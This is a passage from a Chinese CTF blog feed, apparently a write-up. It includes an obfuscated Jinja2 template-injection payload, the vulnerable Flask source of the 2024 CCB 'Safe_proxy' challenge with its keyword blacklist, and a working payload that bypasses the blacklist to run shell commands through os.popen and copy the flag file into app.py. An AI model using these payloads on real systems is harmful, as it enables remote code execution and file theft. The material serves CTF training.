class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yd=dict(a=x,b=x,c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> <span class="hljs-keyword">in</span>=dict(tini=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ii=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+<span class="hljs-keyword">in</span>+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gl=dict(slabolg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> go=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+gl+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ge=dict(metiteg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gi=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+ge+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bu=dict(snitliub=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bl=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+bu+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> im=dict(tropmi=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ip=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+im+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yt=dict(aaaaa=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> pw=yd+la<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> iw=&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>count<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> et=iw+lla<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> po=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cf=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*(lla+la))%(sbb+et+bb,sbb+et+pw,llla+yt,iw+bb,sbb+et+bb+yd,sbb+et+lla+pw,sbb+et+pw,sbb+et+bb+pw,et+bb+yd,llla+yt,llla+bb+yd,llla+yt)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span> (((((((((((x,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,ii)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,go)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(bl),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(ip))(xq),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,po)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(cf),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,re)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)()<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><ul><li>成功获得本地demo的flag</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200022125.png" alt="image-20241220002258598"></p><h3 id="2024-CCB-Safe-proxy"><a href="#2024-CCB-Safe-proxy" class="headerlink" title="2024-CCB-Safe_proxy"></a>2024-CCB-Safe_proxy</h3><p>访问页面，得到源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    template_code = request.form.get(<span class="hljs-string">&quot;code&quot;</span>)<br>    <span class="hljs-comment"># 安全过滤</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>]<br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> template_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden content detected!&quot;</span><br>    result = render_template_string(template_code)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;error&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPProxyHandler</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>        <span class="hljs-variable language_">self</span>.target_host = target_host<br>        <span class="hljs-variable language_">self</span>.target_port = target_port<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>(<span class="hljs-params">self, client_socket</span>):<br>        <span class="hljs-keyword">try</span>:<br>            request_data = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                chunk = client_socket.recv(<span class="hljs-number">4096</span>)<br>                request_data += chunk<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">4096</span>:<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_data:<br>                client_socket.close()<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> proxy_socket:<br>                proxy_socket.connect((<span class="hljs-variable language_">self</span>.target_host, <span class="hljs-variable language_">self</span>.target_port))<br>                proxy_socket.sendall(request_data)<br><br>                response_data = <span class="hljs-string">b&quot;&quot;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = proxy_socket.recv(<span class="hljs-number">4096</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    response_data += chunk<br><br>            header_end = response_data.rfind(<span class="hljs-string">b&quot;\r\n\r\n&quot;</span>)<br>            <span class="hljs-keyword">if</span> header_end != -<span class="hljs-number">1</span>:<br>                body = response_data[header_end + <span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">else</span>:<br>                body = response_data<br>                <br>            response_body = body<br>            response = <span class="hljs-string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(response_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;\r\n&quot;</span> + response_body<br><br>            client_socket.sendall(response)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            client_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy_server</span>(<span class="hljs-params">host, port, target_host, target_port</span>):<br>    proxy_handler = HTTPProxyHandler(target_host, target_port)<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy server is running on <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span> and forwarding to <span class="hljs-subst">&#123;target_host&#125;</span>:<span class="hljs-subst">&#123;target_port&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket, addr = server_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))<br>            thread.daemon = <span class="hljs-literal">True</span><br>            thread.start()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shutting down proxy server...&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        server_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_flask_app</span>():<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    proxy_host = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    proxy_port = <span class="hljs-number">5001</span><br>    target_host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-number">5000</span><br><br>    <span class="hljs-comment"># 安全反代，防止针对响应头的攻击</span><br>    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))<br>    proxy_thread.daemon = <span class="hljs-literal">True</span><br>    proxy_thread.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting Flask app...&quot;</span>)<br>    run_flask_app()<br></code></pre></td></tr></table></figure><ul><li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li><li>把<code>flag</code>重定向到<code>app.py</code>上</li><li>绕过<code>blacklist = [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;system&#39;, &#39;\r&#39;, &#39;\n&#39;]</code></li><li><code>__ -&gt; &#39;_&#39;+&#39;_&#39;</code></li><li><code>os -&gt; &#39;o&#39;+&#39;s&#39;</code></li></ul><p>最终<code>payload</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">code=&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;globals&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;builtins&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;impo&#x27;</span><span class="hljs-string">&#x27;rt&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>%&#125;&#123;&#123;cycler.<span class="hljs-built_in">next</span>[a][b][c](d)[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat ../../../flag &gt; app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029756.png" alt="img"></p><ul><li>回退</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029730.png" alt="img"></p><p><strong>后续研究</strong></p><p>其实可以fenjing一把嗦，但是需要修改一下代码，改成有回显的。</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029578.png" alt="40a93733048c34b153835a040397d5d"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:5000&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;code=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029651.png" alt="e55316d39cd823a891b32f1b9aad922"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XU17</title>
    <link href="/2024/11/18/XU17/"/>
    <url>/2024/11/18/XU17/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/18/hello-world/"/>
    <url>/2024/11/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
